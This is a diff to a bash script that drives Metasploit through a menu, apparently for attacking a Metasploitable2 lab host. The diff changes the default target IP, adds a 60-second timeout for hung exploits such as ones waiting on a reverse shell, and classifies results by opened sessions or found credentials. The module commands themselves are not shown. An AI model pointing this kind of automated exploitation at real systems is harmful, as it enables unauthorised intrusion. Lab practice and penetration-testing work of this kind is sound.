@@ -80,7 +80,7 @@ fi
 # STEP 2: Ask for target IP
 # ============================================================
 TARGET_IP=$(whiptail --title "Metasploit Attack Console" \
-  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "192.168.2.20" \
+  --inputbox "Enter target IP (Metasploitable2 host IP):" 10 60 "10.70.8.200" \
   3>&1 1>&2 2>&3)
 if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
   echo -e "${RED}[ERROR] No target IP provided. Aborting.${NC}"
@@ -89,6 +89,7 @@ fi
 
 LHOST=$(hostname -I | awk '{print $1}')
 ATTACK_LOG=()
+ATTACK_TIMEOUT=60   # seconds — a hung exploit (e.g. waiting on a reverse shell) gets killed and moves on
 
 # ============================================================
 # Attack catalog — one entry per known Metasploitable2 module.
@@ -171,17 +172,20 @@ run_attack() {
 
   local full_cmd="setg LHOST $LHOST; setg RHOSTS $TARGET_IP; $msf_cmd"
 
-  echo -e "\n${CYAN}[INFO] Running: $label${NC}"
+  echo -e "\n${CYAN}[INFO] Running: $label (max ${ATTACK_TIMEOUT}s)${NC}"
   echo -e "${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}   Target IP (RHOSTS): ${TARGET_IP}${NC}"
 
   local ts
   ts=$(date '+%Y-%m-%d %H:%M:%S')
 
   local run_output
-  run_output=$(msfconsole -q -x "$full_cmd" | tee /dev/tty)
+  run_output=$(timeout "$ATTACK_TIMEOUT" msfconsole -q -x "$full_cmd" | tee /dev/tty)
+  local exit_code=${PIPESTATUS[0]}
 
   local status
-  if echo "$run_output" | grep -qiE "session [0-9]+ opened"; then
+  if [ "$exit_code" -eq 124 ]; then
+    status="Timed out after ${ATTACK_TIMEOUT}s (no result)"
+  elif echo "$run_output" | grep -qiE "session [0-9]+ opened"; then
     status="Session opened"
   elif echo "$run_output" | grep -qi "login successful"; then
     status="Valid credentials found"
